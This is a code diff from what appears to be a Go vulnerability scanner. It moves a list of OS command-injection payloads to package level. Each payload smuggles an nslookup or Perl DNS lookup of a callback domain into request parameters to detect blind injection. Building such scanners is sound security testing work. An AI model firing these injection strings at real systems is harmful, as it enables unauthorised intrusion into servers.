@@ -17,6 +17,15 @@ import (
 	"time"
 )
 
+var domainPayloadList = []string{
+	`|(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`,
+	// `&(nslookup {domain}||perl -e "gethostbyname(\'{domain}\')")&\'\\"`0&(nslookup {domain}||perl -e "gethostbyname(\'{domain}\')")&`\'`,
+	`;(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")|(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")&(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`,
+	"(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")",
+	"$(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")",
+	"`(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`",
+}
+
 func Scan(in *input.CrawlResult) {
 	res, payload, isvul := startTesting(in)
 	if isvul {
@@ -48,19 +57,11 @@ func startTesting(in *input.CrawlResult) (*httpx.Response, string, bool) {
 	}
 
 	if in.IsSensorServerEnabled {
-		var domainPayloadList = []string{
-			`|(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`,
-			// `&(nslookup {domain}||perl -e "gethostbyname(\'{domain}\')")&\'\\"`0&(nslookup {domain}||perl -e "gethostbyname(\'{domain}\')")&`\'`,
-			`;(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")|(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")&(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`,
-			"(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")",
-			"$(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")",
-			"`(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`",
-		}
-
 		dnslog := reverse.GetSubDomain()
 
 		if variations != nil {
 			for _, p := range variations.Params {
+				//todo 奇怪这里为什么会崩溃？
 				for _, payload := range domainPayloadList {
 					s1 := strings.ReplaceAll(payload, "{domain}", dnslog.Domain)
 
